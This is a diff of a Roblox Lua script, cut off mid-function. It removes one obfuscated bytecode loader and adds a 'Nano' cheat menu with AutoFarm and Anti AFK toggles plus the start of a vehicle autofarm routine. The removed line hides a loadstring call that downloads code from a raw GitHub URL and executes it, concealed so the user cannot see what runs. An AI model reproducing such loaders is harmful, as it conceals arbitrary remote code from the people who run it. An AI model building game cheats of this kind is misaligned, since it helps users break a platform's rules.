@@ -1,1 +1,585 @@
-local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==81) then v19=v0(v3(v30,1,1));return "";else local v82=0;local v83;while true do if (v82==0) then v83=v2(v0(v30,16));if v19 then local v98=0;local v99;while true do if (v98==0) then v99=v5(v83,v19);v19=nil;v98=1;end if (v98==1) then return v99;end end else return v83;end break;end end end end);local function v20(v31,v32,v33) if v33 then local v84=(v31/(((882 -(282 + 595)) -(1640 -(1523 + 114)))^(v32-(2 -1))))%((3 -1)^(((v33-(2 -1)) -(v32-(620 -(555 + 64)))) + 1)) ;return v84-(v84%(932 -(857 + 74))) ;else local v85=(570 -(367 + 201))^(v32-(928 -(214 + 713))) ;return (((v31%(v85 + v85))>=v85) and (1 + 0)) or (0 + 0) ;end end local function v21() local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22() local v35=0 + 0 ;local v36;local v37;while true do if (v35==(118 -(32 + 85))) then return (v37 * (364 -108)) + v36 ;end if (v35==(1065 -(68 + 997))) then v36,v37=v1(v16,v18,v18 + (1272 -(226 + 1044)) );v18=v18 + (8 -6) ;v35=1;end end end local function v23() local v38,v39,v40,v41=v1(v16,v18,v18 + 3 + 0 );v18=v18 + 1 + 3 ;return (v41 * 16777216) + (v40 * (66493 -((1648 -756) + 65))) + (v39 * (610 -(649 -295))) + v38 ;end local function v24() local v42=v23();local v43=v23();local v44=1;local v45=(v20(v43,351 -(87 + 263) ,(628 -428) -(67 + (131 -(10 + 8))) ) * ((2 + 0)^(78 -46))) + v42 ;local v46=v20(v43,16 + 5 ,(472 -349) -92 );local v47=((v20(v43,984 -((1244 -(416 + 26)) + 150) )==(2 -1)) and  -((3 -2) -0)) or (1 + 0) ;if (v46==(997 -(915 + 82))) then if (v45==0) then return v47 * (0 -0) ;else local v90=0 + 0 ;while true do if (v90==0) then v46=1 -0 ;v44=1187 -(1069 + 118) ;break;end end end elseif (v46==((1993 + 2650) -2596)) then return ((v45==(0 -0)) and (v47 * ((1 + 0)/(0 -0)))) or (v47 * NaN) ;end return v8(v47,v46-1023 ) * (v44 + (v45/((2 + 0)^(843 -(368 + (747 -324)))))) ;end local function v25(v48) local v49;if  not v48 then local v86=438 -(145 + 293) ;while true do if (v86==(430 -(44 + 386))) then v48=v23();if (v48==(1486 -(998 + 488))) then return "";end break;end end end v49=v3(v16,v18,(v18 + v48) -1 );v18=v18 + v48 ;local v50={};for v65=1 + 0 , #v49 do v50[v65]=v2(v1(v3(v49,v65,v65)));end return v6(v50);end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v51=(function() return 166 -(9 + 157) ;end)();local v52=(function() return;end)();local v53=(function() return;end)();local v54=(function() return;end)();local v55=(function() return;end)();local v56=(function() return;end)();local v57=(function() return;end)();local v58=(function() return;end)();while true do local v67=(function() return 0 -0 ;end)();while true do if (v67==(1825 -(1195 + 629))) then if (v51~=(1 -0)) then else local v95=(function() return 241 -(187 + 54) ;end)();while true do if (v95~=(1 + 1)) then else v51=(function() return 782 -(162 + 618) ;end)();break;end if (v95==(1 + 0)) then v58=(function() return {};end)();for v122= #"!",v57 do local v123=(function() return 0;end)();local v124=(function() return;end)();local v125=(function() return;end)();local v126=(function() return;end)();while true do if (v123==(0 + 0)) then local v173=(function() return 0;end)();while true do if (v173~=(1 + 0)) then else v123=(function() return 530 -(406 + 123) ;end)();break;end if (v173==0) then v124=(function() return 1769 -(1749 + 20) ;end)();v125=(function() return nil;end)();v173=(function() return 1;end)();end end end if (v123~=(1 + 0)) then else v126=(function() return nil;end)();while true do if (v124==(1 + 0)) then if (v125== #"!") then v126=(function() return v21()~=(0 -0) ;end)();elseif (v125==(2 -0)) then v126=(function() return v24();end)();elseif (v125== #"xnx") then v126=(function() return v25();end)();end v58[v122]=(function() return v126;end)();break;end if (v124~=(0 + 0)) then else local v185=(function() return 1145 -(466 + 679) ;end)();while true do if (v185~=1) then else v124=(function() return 1 + 0 ;end)();break;end if (v185==(1636 -(1373 + 263))) then v125=(function() return v21();end)();v126=(function() return nil;end)();v185=(function() return 1001 -(451 + 549) ;end)();end end end end break;end end end v95=(function() return 1902 -(106 + 1794) ;end)();end if (v95==(0 + 0)) then v56=(function() return {v53,v54,nil,v55};end)();v57=(function() return v23();end)();v95=(function() return 1 -0 ;end)();end end end break;end if (v67~=(0 -0)) then else if (v51==(0 -0)) then local v96=(function() return 0 -0 ;end)();while true do if (v96==(1385 -(746 + 638))) then v54=(function() return {};end)();v55=(function() return {};end)();v96=(function() return 1 + 1 ;end)();end if (v96==(0 -0)) then v52=(function() return function(v133,v134,v135) local v136=(function() return 0;end)();local v137=(function() return;end)();while true do if (v136~=(341 -(218 + 123))) then else v137=(function() return 0;end)();while true do if (v137~=0) then else local v186=(function() return 1581 -(1535 + 46) ;end)();while true do if ((0 + 0)~=v186) then else local v188=(function() return 0 + 0 ;end)();while true do if ((0 -0)==v188) then v133[v134-#"," ]=(function() return v135();end)();return v133,v134,v135;end end end end end end break;end end end;end)();v53=(function() return {};end)();v96=(function() return 1;end)();end if ((1 + 1)==v96) then v51=(function() return 2 -1 ;end)();break;end end end if (v51==(562 -(306 + 254))) then v56[ #"nil"]=(function() return v21();end)();for v100= #"[",v23() do local v101=(function() return v21();end)();if (v20(v101, #"}", #">")==(0 + 0)) then local v117=(function() return 0 -0 ;end)();local v118=(function() return;end)();local v119=(function() return;end)();local v120=(function() return;end)();local v121=(function() return;end)();while true do if (v117==(1467 -(899 + 568))) then local v167=(function() return 0 + 0 ;end)();local v168=(function() return;end)();while true do if (v167~=(0 + 0)) then else v168=(function() return 0 + 0 ;end)();while true do if (v168==(1 -0)) then v117=(function() return 2 -1 ;end)();break;end if (v168==(603 -(268 + 335))) then v118=(function() return 0 + 0 ;end)();v119=(function() return nil;end)();v168=(function() return 1;end)();end end break;end end end if (v117==(291 -(60 + 230))) then local v169=(function() return 0;end)();while true do if (1~=v169) then else v117=(function() return 1259 -(1043 + 214) ;end)();break;end if (v169==0) then v120=(function() return nil;end)();v121=(function() return nil;end)();v169=(function() return 573 -(426 + 146) ;end)();end end end if (v117==(1 + 1)) then while true do if (v118==(1212 -(323 + 889))) then local v178=(function() return 0;end)();local v179=(function() return;end)();while true do if (v178==(1456 -(282 + 1174))) then v179=(function() return 811 -(569 + 242) ;end)();while true do if ((580 -(361 + 219))==v179) then v119=(function() return v20(v101,322 -(53 + 267) , #"19(");end)();v120=(function() return v20(v101, #"asd1",17 -11 );end)();v179=(function() return 414 -(15 + 398) ;end)();end if (v179==(1 + 0)) then v118=(function() return  #",";end)();break;end end break;end end end if (v118==(7 -5)) then local v180=(function() return 0 + 0 ;end)();local v181=(function() return;end)();while true do if (v180~=(1024 -(706 + 318))) then else v181=(function() return 1251 -(721 + 530) ;end)();while true do if (v181~=(1271 -(945 + 326))) then else if (v20(v120, #"[", #"<")== #"~") then v121[2 + 0 ]=(function() return v58[v121[4 -2 ]];end)();end if (v20(v120,2 + 0 ,2)== #"}") then v121[ #"19("]=(function() return v58[v121[ #"91("]];end)();end v181=(function() return 701 -(271 + 429) ;end)();end if (v181==(1 + 0)) then v118=(function() return  #"asd";end)();break;end end break;end end end if (v118~= #"{") then else local v182=(function() return 1500 -(1408 + 92) ;end)();while true do if (v182~=(1 + 0)) then else v118=(function() return 1088 -(461 + 625) ;end)();break;end if (v182==0) then v121=(function() return {v22(),v22(),nil,nil};end)();if (v119==(1288 -(993 + 295))) then local v189=(function() return 0 -0 ;end)();local v190=(function() return;end)();while true do if (v189==(1551 -(1126 + 425))) then v190=(function() return 405 -(118 + 287) ;end)();while true do if (v190==(0 -0)) then v121[ #"91("]=(function() return v22();end)();v121[ #".com"]=(function() return v22();end)();break;end end break;end end elseif (v119== #"[") then v121[ #"91("]=(function() return v23();end)();elseif (v119==(1 + 1)) then v121[ #"xxx"]=(function() return v23() -(2^(46 -30)) ;end)();elseif (v119== #"-19") then local v198=(function() return 377 -(142 + 235) ;end)();local v199=(function() return;end)();while true do if (0~=v198) then else v199=(function() return 0;end)();while true do if (v199==0) then v121[ #"xnx"]=(function() return v23() -((9 -7)^(4 + 12)) ;end)();v121[ #"asd1"]=(function() return v22();end)();break;end end break;end end end v182=(function() return 978 -(553 + 424) ;end)();end end end if (v118~= #"asd") then else if (v20(v120, #"xxx", #"asd")== #"}") then v121[ #".dev"]=(function() return v58[v121[ #".com"]];end)();end v53[v100]=(function() return v121;end)();break;end end break;end end end end for v102= #"~",v23() do v54,v102,v28=(function() return v52(v54,v102,v28);end)();end return v56;end v67=(function() return 1 -0 ;end)();end end end end local function v29(v59,v60,v61) local v62=v59[1];local v63=v59[2];local v64=v59[3 + 0 ];return function(...) local v68=v62;local v69=v63;local v70=v64;local v71=v27;local v72=1 + 0 ;local v73= -(1 + 0);local v74={};local v75={...};local v76=v12("#",...) -(1 + 0) ;local v77={};local v78={};for v87=0,v76 do if (v87>=v70) then v74[v87-v70 ]=v75[v87 + (2 -1) ];else v78[v87]=v75[v87 + (2 -1) ];end end local v79=(v76-v70) + (2 -1) ;local v80;local v81;while true do v80=v68[v72];v81=v80[1 + 0 ];if (v81<=(14 -11)) then if ((432<588) and (v81<=1)) then if (v81==(753 -(239 + 514))) then local v103=0 + 0 ;local v104;local v105;local v106;local v107;local v108;while true do if ((4797>=3895) and (v103==(1337 -(797 + 532)))) then v80=v68[v72];v78[v80[(3 -1) + 0 ]]();v72=v72 + 1 ;v80=v68[v72];v103=4 + 5 ;end if ((3577==3577) and (v103==(13 -7))) then v73=(v106 + v108) -(1203 -((999 -626) + 829)) ;v104=731 -(476 + 255) ;for v170=v108,v73 do v104=v104 + (1131 -(369 + 761)) ;v78[v170]=v105[v104];end v72=v72 + 1 + 0 ;v103=12 -5 ;end if (v103==9) then do return;end break;end if ((3794>3693) and (v103==((1228 -(322 + 905)) -0))) then v78[v80[240 -(64 + 174) ]]={};v72=v72 + 1 + 0 ;v80=v68[v72];v78[v80[2 -0 ]]=v61[v80[339 -(144 + 192) ]];v103=2;end if (v103==(223 -(42 + (785 -(602 + 9))))) then v80=v68[v72];v108=v80[2 + 0 ];v78[v108]=v78[v108](v13(v78,v108 + 1 ,v73));v72=v72 + 1 + 0 ;v103=4 + 4 ;end if ((v103==(1504 -(363 + 1141))) or (1275==4100)) then v104=nil;v105,v106=nil;v107=nil;v108=nil;v103=1;end if (v103==(1585 -((2372 -(449 + 740)) + 397))) then v72=v72 + ((874 -(826 + 46)) -(948 -(245 + 702))) ;v80=v68[v72];v108=v80[2 + 0 ];v105,v106=v71(v78[v108](v13(v78,v108 + 1 ,v80[3 + 0 ])));v103=1981 -(1913 + 62) ;end if (v103==4) then v78[v108]=v107[v80[3 + 1 ]];v72=v72 + (2 -1) ;v80=v68[v72];v78[v80[2]]=v80[3];v103=1938 -(565 + 1368) ;end if (v103==(7 -5)) then v72=v72 + 1 ;v80=v68[v72];v78[v80[1663 -((4667 -3190) + 60 + 124) ]]=v61[v80[3 -0 ]];v72=v72 + 1 + 0 ;v103=859 -(564 + 292) ;end if (v103==(4 -1)) then v80=v68[v72];v108=v80[5 -3 ];v107=v78[v80[3]];v78[v108 + (305 -(244 + 60)) ]=v107;v103=4 + 0 ;end end else v78[v80[478 -((1939 -(260 + 1638)) + 435) ]]={};end elseif ((v81==2) or (1591>=3580)) then local v110=440 -(382 + 58) ;local v111;local v112;while true do if (v110==(1002 -((3008 -2070) + 53 + 10))) then v78[v111 + 1 ]=v112;v78[v111]=v112[v80[4 + 0 ]];break;end if (v110==(1125 -(936 + 189))) then v111=v80[1 + (1 -0) ];v112=v78[v80[(4803 -3187) -(1565 + 48) ]];v110=1 + 0 ;end end else v78[v80[(2345 -(902 + 303)) -(782 + 356) ]]=v61[v80[3]];end elseif ((983<=1808) and (v81<=(272 -((385 -209) + 91)))) then if ((v81==(10 -6)) or (2150<=1197)) then v78[v80[2 -0 ]]();else do return;end end elseif (v81<=6) then v78[v80[1094 -((2348 -1373) + 117) ]]=v80[3];elseif (v81>7) then local v127=v80[1877 -(157 + 1718) ];local v128,v129=v71(v78[v127](v13(v78,v127 + 1 ,v80[3 + 0 ])));v73=(v129 + v127) -(3 -(1 + 1)) ;local v130=0;for v165=v127,v73 do local v166=0 -0 ;while true do if ((3769>=1173) and (v166==(1018 -(697 + 321)))) then v130=v130 + (2 -1) ;v78[v165]=v128[v130];break;end end end else local v131=0 -0 ;local v132;while true do if (0==v131) then v132=v80[4 -2 ];v78[v132]=v78[v132](v13(v78,v132 + (1691 -(1121 + 569)) + 0 ,v73));break;end end end v72=v72 + 1 ;end end;end return v29(v28(),{},v17)(...);end return v15("LOL!043Q00030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q7470476574033F3Q00682Q7470733A2Q2F7261772E67697468756275736572636F6E74656E742E636F6D2F42697261383935322F72657363686F2F6D61696E2F726573637361736400099Q003Q00122Q000100013Q00122Q000200023Q00202Q00020002000300122Q000400046Q000200046Q00013Q00024Q0001000100016Q00017Q00",v9(),...);
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local ScreenGui = Instance.new("ScreenGui")
+local Tab1Content = Instance.new("Frame")
+local UICorner = Instance.new("UICorner")
+local Tab2Content = Instance.new("Frame")
+local UICorner_2 = Instance.new("UICorner")
+local Tab3Content = Instance.new("Frame")
+local UICorner_3 = Instance.new("UICorner")
+local Tab4Content = Instance.new("Frame")
+local UICorner_4 = Instance.new("UICorner")
+local Tab5Content = Instance.new("Frame")
+local UICorner_5 = Instance.new("UICorner")
+local TextLabel = Instance.new("TextLabel")
+local TextLabel_2 = Instance.new("TextLabel")
+local ToggleButton = Instance.new("TextButton")
+local UICorner_6 = Instance.new("UICorner")
+local TextLabel_3 = Instance.new("TextLabel")
+local TextButton = Instance.new("TextButton")
+local UICorner_7 = Instance.new("UICorner")
+local TextLabel_4 = Instance.new("TextLabel")
+local TabButton1 = Instance.new("TextButton")
+local ImageLabel = Instance.new("ImageLabel")
+local UICorner_8 = Instance.new("UICorner")
+local UICorner_9 = Instance.new("UICorner")
+local TabButton2 = Instance.new("TextButton")
+local ImageLabel_2 = Instance.new("ImageLabel")
+local UICorner_10 = Instance.new("UICorner")
+local UICorner_11 = Instance.new("UICorner")
+local TabButton3 = Instance.new("TextButton")
+local ImageLabel_3 = Instance.new("ImageLabel")
+local UICorner_12 = Instance.new("UICorner")
+local UICorner_13 = Instance.new("UICorner")
+local TabButton4 = Instance.new("TextButton")
+local ImageLabel_4 = Instance.new("ImageLabel")
+local UICorner_14 = Instance.new("UICorner")
+local UICorner_15 = Instance.new("UICorner")
+local TabButton5 = Instance.new("TextButton")
+local ImageLabel_5 = Instance.new("ImageLabel")
+local UICorner_16 = Instance.new("UICorner")
+local UICorner_17 = Instance.new("UICorner")
+local TextLabel_5 = Instance.new("TextLabel")
+
+--Properties:
+
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+Tab1Content.Name = "Tab1Content"
+Tab1Content.Parent = ScreenGui
+Tab1Content.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
+Tab1Content.BackgroundTransparency = 0.500
+Tab1Content.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Tab1Content.BorderSizePixel = 0
+Tab1Content.Position = UDim2.new(0.268000007, 0, 0.365999997, 0)
+Tab1Content.Size = UDim2.new(0, 473, 0, 245)
+
+UICorner.Parent = Tab1Content
+
+Tab2Content.Name = "Tab2Content"
+Tab2Content.Parent = ScreenGui
+Tab2Content.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
+Tab2Content.BackgroundTransparency = 0.500
+Tab2Content.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Tab2Content.BorderSizePixel = 0
+Tab2Content.Position = UDim2.new(0.268000007, 0, 0.365999997, 0)
+Tab2Content.Size = UDim2.new(0, 473, 0, 245)
+Tab2Content.Visible = false
+
+UICorner_2.Parent = Tab2Content
+
+Tab3Content.Name = "Tab3Content"
+Tab3Content.Parent = ScreenGui
+Tab3Content.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
+Tab3Content.BackgroundTransparency = 0.500
+Tab3Content.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Tab3Content.BorderSizePixel = 0
+Tab3Content.Position = UDim2.new(0.268000007, 0, 0.365999997, 0)
+Tab3Content.Size = UDim2.new(0, 473, 0, 245)
+Tab3Content.Visible = false
+
+UICorner_3.Parent = Tab3Content
+
+Tab4Content.Name = "Tab4Content"
+Tab4Content.Parent = ScreenGui
+Tab4Content.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
+Tab4Content.BackgroundTransparency = 0.500
+Tab4Content.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Tab4Content.BorderSizePixel = 0
+Tab4Content.Position = UDim2.new(0.268204749, 0, 0.365671635, 0)
+Tab4Content.Size = UDim2.new(0, 473, 0, 245)
+Tab4Content.Visible = false
+
+UICorner_4.Parent = Tab4Content
+
+Tab5Content.Name = "Tab5Content"
+Tab5Content.Parent = ScreenGui
+Tab5Content.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
+Tab5Content.BackgroundTransparency = 0.500
+Tab5Content.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Tab5Content.BorderSizePixel = 0
+Tab5Content.Position = UDim2.new(0.268000007, 0, 0.365999997, 0)
+Tab5Content.Size = UDim2.new(0, 473, 0, 245)
+
+UICorner_5.Parent = Tab5Content
+
+TextLabel.Parent = Tab5Content
+TextLabel.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
+TextLabel.BackgroundTransparency = 1.000
+TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.BorderSizePixel = 0
+TextLabel.Position = UDim2.new(0.615221977, 0, 0.220408544, 0)
+TextLabel.Size = UDim2.new(0, 140, 0, 28)
+TextLabel.Font = Enum.Font.SourceSans
+TextLabel.Text = "For Truck/Bus"
+TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.TextSize = 20.000
+TextLabel.TextWrapped = true
+
+TextLabel_2.Parent = Tab5Content
+TextLabel_2.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
+TextLabel_2.BackgroundTransparency = 1.000
+TextLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_2.BorderSizePixel = 0
+TextLabel_2.Position = UDim2.new(0.202959836, 0, 0.191837102, 0)
+TextLabel_2.Size = UDim2.new(0, 109, 0, 42)
+TextLabel_2.Font = Enum.Font.SourceSans
+TextLabel_2.Text = "AutoFarm"
+TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_2.TextSize = 24.000
+TextLabel_2.TextWrapped = true
+
+ToggleButton.Name = "ToggleButton"
+ToggleButton.Parent = Tab5Content
+ToggleButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ToggleButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ToggleButton.BorderSizePixel = 0
+ToggleButton.Position = UDim2.new(0.458773792, 0, 0.240816325, 0)
+ToggleButton.Size = UDim2.new(0, 56, 0, 18)
+ToggleButton.Font = Enum.Font.SourceSans
+ToggleButton.Text = ""
+ToggleButton.TextColor3 = Color3.fromRGB(0, 0, 0)
+ToggleButton.TextSize = 14.000
+
+UICorner_6.Parent = ToggleButton
+
+TextLabel_3.Parent = Tab5Content
+TextLabel_3.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
+TextLabel_3.BackgroundTransparency = 1.000
+TextLabel_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_3.BorderSizePixel = 0
+TextLabel_3.Position = UDim2.new(0.167019024, 0, 0.45306161, 0)
+TextLabel_3.Size = UDim2.new(0, 109, 0, 42)
+TextLabel_3.Font = Enum.Font.SourceSans
+TextLabel_3.Text = "Anti AFK"
+TextLabel_3.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_3.TextSize = 24.000
+TextLabel_3.TextWrapped = true
+
+TextButton.Parent = Tab5Content
+TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton.BorderSizePixel = 0
+TextButton.Position = UDim2.new(0.458773792, 0, 0.502040803, 0)
+TextButton.Size = UDim2.new(0, 56, 0, 18)
+TextButton.Font = Enum.Font.SourceSans
+TextButton.Text = ""
+TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton.TextSize = 14.000
+
+UICorner_7.Parent = TextButton
+
+TextLabel_4.Parent = Tab5Content
+TextLabel_4.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
+TextLabel_4.BackgroundTransparency = 1.000
+TextLabel_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_4.BorderSizePixel = 0
+TextLabel_4.Position = UDim2.new(0.405919671, 0, 0.334694237, 0)
+TextLabel_4.Size = UDim2.new(0, 106, 0, 37)
+TextLabel_4.Font = Enum.Font.SourceSans
+TextLabel_4.Text = "Truck Better than bus"
+TextLabel_4.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_4.TextScaled = true
+TextLabel_4.TextSize = 24.000
+TextLabel_4.TextWrapped = true
+
+TabButton1.Name = "TabButton1"
+TabButton1.Parent = ScreenGui
+TabButton1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TabButton1.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TabButton1.BorderSizePixel = 0
+TabButton1.Position = UDim2.new(0.267483771, 0, 0.442786068, 0)
+TabButton1.Size = UDim2.new(0, 29, 0, 28)
+TabButton1.Font = Enum.Font.SourceSans
+TabButton1.Text = ""
+TabButton1.TextColor3 = Color3.fromRGB(0, 0, 0)
+TabButton1.TextSize = 14.000
+
+ImageLabel.Parent = TabButton1
+ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ImageLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ImageLabel.BorderSizePixel = 0
+ImageLabel.Position = UDim2.new(0.00242035976, 0, -0.0253241397, 0)
+ImageLabel.Size = UDim2.new(0, 29, 0, 28)
+ImageLabel.Image = "rbxassetid://88588764425916"
+
+UICorner_8.Parent = ImageLabel
+
+UICorner_9.Parent = TabButton1
+
+TabButton2.Name = "TabButton2"
+TabButton2.Parent = ScreenGui
+TabButton2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TabButton2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TabButton2.BorderSizePixel = 0
+TabButton2.Position = UDim2.new(0.267483771, 0, 0.49502483, 0)
+TabButton2.Size = UDim2.new(0, 29, 0, 24)
+TabButton2.Font = Enum.Font.SourceSans
+TabButton2.Text = ""
+TabButton2.TextColor3 = Color3.fromRGB(0, 0, 0)
+TabButton2.TextSize = 14.000
+
+ImageLabel_2.Parent = TabButton2
+ImageLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ImageLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ImageLabel_2.BorderSizePixel = 0
+ImageLabel_2.Position = UDim2.new(0.00384205789, 0, -0.180809021, 0)
+ImageLabel_2.Size = UDim2.new(0, 29, 0, 28)
+ImageLabel_2.Image = "rbxassetid://80344636434924"
+
+UICorner_10.Parent = ImageLabel_2
+
+UICorner_11.Parent = TabButton2
+
+TabButton3.Name = "TabButton3"
+TabButton3.Parent = ScreenGui
+TabButton3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TabButton3.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TabButton3.BorderSizePixel = 0
+TabButton3.Position = UDim2.new(0.266762793, 0, 0.536069691, 0)
+TabButton3.Size = UDim2.new(0, 29, 0, 28)
+TabButton3.Font = Enum.Font.SourceSans
+TabButton3.Text = ""
+TabButton3.TextColor3 = Color3.fromRGB(0, 0, 0)
+TabButton3.TextSize = 14.000
+
+ImageLabel_3.Parent = TabButton3
+ImageLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ImageLabel_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ImageLabel_3.BorderSizePixel = 0
+ImageLabel_3.Position = UDim2.new(0.0344827585, 0, -0.00714220339, 0)
+ImageLabel_3.Size = UDim2.new(0, 29, 0, 28)
+ImageLabel_3.Image = "rbxassetid://127517474134602"
+
+UICorner_12.Parent = ImageLabel_3
+
+UICorner_13.Parent = TabButton3
+
+TabButton4.Name = "TabButton4"
+TabButton4.Parent = ScreenGui
+TabButton4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TabButton4.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TabButton4.BorderSizePixel = 0
+TabButton4.Position = UDim2.new(0.267483771, 0, 0.579602122, 0)
+TabButton4.Size = UDim2.new(0, 27, 0, 28)
+TabButton4.Font = Enum.Font.SourceSans
+TabButton4.Text = ""
+TabButton4.TextColor3 = Color3.fromRGB(0, 0, 0)
+TabButton4.TextSize = 14.000
+
+ImageLabel_4.Parent = TabButton4
+ImageLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ImageLabel_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ImageLabel_4.BorderSizePixel = 0
+ImageLabel_4.Position = UDim2.new(0.0735031664, 0, 0, 0)
+ImageLabel_4.Size = UDim2.new(0, 29, 0, 28)
+ImageLabel_4.Image = "rbxassetid://81756895969768"
+
+UICorner_14.Parent = ImageLabel_4
+
+UICorner_15.Parent = TabButton4
+
+TabButton5.Name = "TabButton5"
+TabButton5.Parent = ScreenGui
+TabButton5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TabButton5.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TabButton5.BorderSizePixel = 0
+TabButton5.Position = UDim2.new(0.267483771, 0, 0.623134315, 0)
+TabButton5.Size = UDim2.new(0, 29, 0, 28)
+TabButton5.Font = Enum.Font.SourceSans
+TabButton5.Text = ""
+TabButton5.TextColor3 = Color3.fromRGB(0, 0, 0)
+TabButton5.TextSize = 14.000
+
+ImageLabel_5.Parent = TabButton5
+ImageLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ImageLabel_5.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ImageLabel_5.BorderSizePixel = 0
+ImageLabel_5.Position = UDim2.new(0.0235932451, 0, -0.0214277003, 0)
+ImageLabel_5.Size = UDim2.new(0, 29, 0, 28)
+ImageLabel_5.Image = "rbxassetid://125871061432583"
+
+UICorner_16.Parent = ImageLabel_5
+
+UICorner_17.Parent = TabButton5
+
+TextLabel_5.Parent = ScreenGui
+TextLabel_5.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
+TextLabel_5.BackgroundTransparency = 1.000
+TextLabel_5.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_5.BorderSizePixel = 0
+TextLabel_5.Position = UDim2.new(0.267483771, 0, 0.383084565, 0)
+TextLabel_5.Size = UDim2.new(0, 81, 0, 31)
+TextLabel_5.Font = Enum.Font.Unknown
+TextLabel_5.Text = "Nano"
+TextLabel_5.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_5.TextScaled = true
+TextLabel_5.TextSize = 14.000
+TextLabel_5.TextWrapped = true
+
+-- Scripts:
+
+local function CWSX_fake_script() -- ToggleButton.LocalScript 
+	local script = Instance.new('LocalScript', ToggleButton)
+
+	local Players = game:GetService("Players")
+	local LocalPlayer = Players.LocalPlayer
+	local VehiclesFolder = workspace:WaitForChild("Vehicles")
+	local VirtualUser = game:GetService("VirtualUser")
+	local TweenService = game:GetService("TweenService")
+	
+	local FARMPos
+	local FARMLastPos
+	local FARMcooldown = false
+	local FARMheight = 200
+	local FARMspeed = 100
+	local FARMcurrentTween = nil
+	local FARMstopFarm = false
+	local autoFarmToggle = false
+	
+	-- Button für das Ein- und Ausschalten des Autofarms
+	local screenGui = LocalPlayer.PlayerGui:WaitForChild("ScreenGui") -- Achte darauf, dass du den richtigen ScreenGui-Namen verwendest
+	local toggleButton = screenGui:WaitForChild("ToggleButton") -- Button zum Umschalten des Autofarms
+	
+	toggleButton.MouseButton1Click:Connect(function()
+		autoFarmToggle = not autoFarmToggle -- Umschalten des Status
+		if autoFarmToggle then
+			toggleButton.Text = "Autofarm: An" -- Text ändern, um anzuzeigen, dass der Autofarm an ist
+		else
+			toggleButton.Text = "Autofarm: Aus" -- Text ändern, um anzuzeigen, dass der Autofarm aus ist
+		end
+	end)
+	
+	-- Funktion: Sicherstellen, dass der Spieler im Fahrzeug bleibt
+	local function ensurePlayerInVehicle()
+		local vehicle = workspace.Vehicles:FindFirstChild(LocalPlayer.Name)
+		if vehicle and LocalPlayer.Character then
+			local humanoid = LocalPlayer.Character:FindFirstChild("Humanoid")
+			if humanoid and not humanoid.SeatPart then
+				local driveSeat = vehicle:FindFirstChild("DriveSeat")
+				if driveSeat then
+					driveSeat:Sit(humanoid)
+				end
+			end
+		end
+	end
+	
+	-- Zielpunkte finden
+	local function partfind()
+		for _, v in pairs(LocalPlayer.PlayerGui:GetDescendants()) do
+			if v:IsA("BillboardGui") and v.Adornee then
+				if v.Adornee.CFrame then
+					return v.Adornee.CFrame
+				end
+			end
+		end
+		return nil
+	end
+	
+	local function destination()
+		for _, v in pairs(workspace.BusStops:GetDescendants()) do
